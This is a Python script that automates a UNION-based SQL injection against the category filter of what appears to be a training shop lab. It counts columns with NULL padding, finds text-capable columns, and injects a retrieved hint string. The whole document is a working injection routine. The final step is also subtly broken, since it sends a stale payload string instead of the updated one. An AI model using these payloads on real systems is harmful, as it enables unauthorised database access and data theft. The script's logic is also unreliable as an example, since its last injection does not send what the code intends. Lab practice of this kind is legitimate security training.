import sys
import logging
import argparse
import urllib3
import re
import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_hint(url, no_proxy):
    log.info("Getting hint")
    resp = requests.get(url)
    pattern = re.compile(r'id="hint">.*?: \'(.*?)\'')
    m = pattern.search(resp.text)
    log.info(f"Found hint: {m[1]}")
    return m[1]

def main(args):
    shop = Shop(args.url, args.no_proxy)
    hint = get_hint(shop.base_url, shop.no_proxy)
    print(hint)
    nulls_list = ["NULL"]
    num_columns = None
    log.info("Determining number of culmn")
    while len(nulls_list) < 50:
        nulls = ",".join(nulls_list)
        category = f"' UNION SELECT {nulls}-- "
        resp = shop.get_category(category)
        if resp.status_code == 200:
            num_columns = len(nulls_list)
            break
        nulls_list.append("NULL")
    if num_columns:        
        log.info(f"Number of columns is : {num_columns}")
    text_columns = []
    for i in range (0, num_columns):
        nulls_list = ["NULL"] * num_columns    
        nulls_list[i] = "'a'"
        nulls = ",".join(nulls_list)
        category = f"' UNION SELECT {nulls}-- "
        resp = shop.get_category(category)
        if resp.status_code == 200:
            text_columns.append(i)
    text_columns_str = ", ".join(map(str, text_columns))            
    log.info(f"The text columns are: {text_columns_str}")
    
    nulls_list = ["NULL"] * num_columns
    nulls_list[text_columns[0]] = f"'{hint}'"
    category = f"' UNION SELECT {nulls}-- "
    resp = shop.get_category(category)
    if resp.status_code == 200:    
        shop.is_solved()
    #29 10
    
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)